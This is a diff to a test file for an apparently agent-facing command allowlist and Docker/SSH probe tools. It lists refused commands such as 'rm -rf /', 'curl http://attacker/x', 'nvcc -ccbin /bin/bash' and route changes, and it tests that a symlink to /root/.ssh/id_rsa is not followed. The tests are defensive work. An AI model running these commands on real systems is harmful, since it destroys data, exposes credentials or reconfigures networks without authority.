@@ -57,6 +57,40 @@ REFUSED = [
     # Not allowlisted.
     "rm -rf /",
     "curl http://attacker/x",
+    # Exec and write modes of allowed binaries (an option allowlist, not a write-flag denylist).
+    "nvcc -ccbin /bin/bash x.cu",
+    "nvcc --run x.cu",
+    "nvcc -o out x.cu",
+    "lstopo-no-graphics -f out.txt",
+    "lstopo-no-graphics topo.xml",
+    "ss -tn -D dump",
+    "ss --diag=dump",
+    "ss -F filterfile",
+    "ss -N otherns",
+    "nvidia-smi nvlink -sc 0bz",
+    "nvidia-smi nvlink -r",
+    "nvidia-smi -l 1",
+    "nvidia-smi mig -cgi 9",
+    "dcgmi discovery --host 10.9.9.9",
+    "dcgmi stats -s job1",
+    "lspci -F dumpfile",
+    "lspci -A intel-conf1 -H1",
+    "ethtool -S eth0 eth1",
+    "ethtool -e eth0 raw on",
+    "sensors -c sensors.conf",
+    "ip -batch cmds",
+    "ip netns exec x id",
+    "ip route add default via 1.2.3.4",
+    "ip link show dev eth0 set down",
+    "free -s 1 -c 999999",
+    "getconf -v spec PATH",
+    # A path never runs, whatever its basename.
+    "/tmp/x/lscpu",
+    "./lscpu",
+    "/usr/bin/lscpu",
+    # A value is never a file name.
+    "nvidia-smi -q --filename=/tmp/x",
+    "nvidia-smi --query-gpu=name --format=/tmp/x",
 ]
 
 ALLOWED = [
@@ -83,6 +117,15 @@ ALLOWED = [
     "nvidia-smi pmon -c 1",
     "dcgmi dmon -e 203,204 -d 1000",
     "cat /proc/1234/status",
+    "nvcc --version",
+    "ip route show",
+    "ip -br addr",
+    "ss -s",
+    "ethtool eth0",
+    "lspci -nnk -s 3b:00.0",
+    "nvidia-smi -q -d PERFORMANCE,CLOCK -i 0",
+    "lstopo-no-graphics --no-io",
+    "df -h /",
 ]
 
 
@@ -232,3 +275,42 @@ async def test_git_show_never_prints_a_secret_a_commit_once_held(tmp_path, monke
     out = await git_show.ainvoke({"ref": "HEAD"})
     assert "main.py" in out, out
     assert "hunter2" not in out and "hunter3" not in out, out
+
+
+async def test_check_node_docker_starts_no_container(monkeypatch):
+    import app.tools.ssh_probes as ssh
+
+    sent = []
+
+    async def fake_run(node_ip, cmd, **kw):
+        sent.append(cmd)
+        return True, "ok"
+
+    async def fake_user(node_ip):
+        return "drut"
+
+    monkeypatch.setattr(ssh, "_run_ssh_command", fake_run)
+    monkeypatch.setattr(ssh, "_resolve_node_user", fake_user)
+    await ssh.check_node_docker.ainvoke({"node_ip": "10.0.0.1"})
+    assert sent and not [c for c in sent if "docker run" in c or "pull" in c], sent
+
+
+def test_a_symlink_in_a_container_is_not_followed(monkeypatch):
+    import types
+
+    import app.tools.docker_probes as D
+
+    archive = types.SimpleNamespace(
+        get_archive=lambda path: ((c for c in [b""]), {"linkTarget": "/root/.ssh/id_rsa", "size": 0}))
+    monkeypatch.setattr(D, "_resolve_container", lambda name: archive)
+    assert D._container_read_raw("api", "/app/key") == ("link", "/root/.ssh/id_rsa")
+
+
+def test_a_container_file_over_the_cap_is_refused_before_it_streams(monkeypatch):
+    import types
+
+    import app.tools.docker_probes as D
+
+    archive = types.SimpleNamespace(get_archive=lambda path: ((c for c in []), {"size": 5_000_000}))
+    monkeypatch.setattr(D, "_resolve_container", lambda name: archive)
+    assert D._container_read_raw("api", "/app/big.bin") == ("big", "5000000")
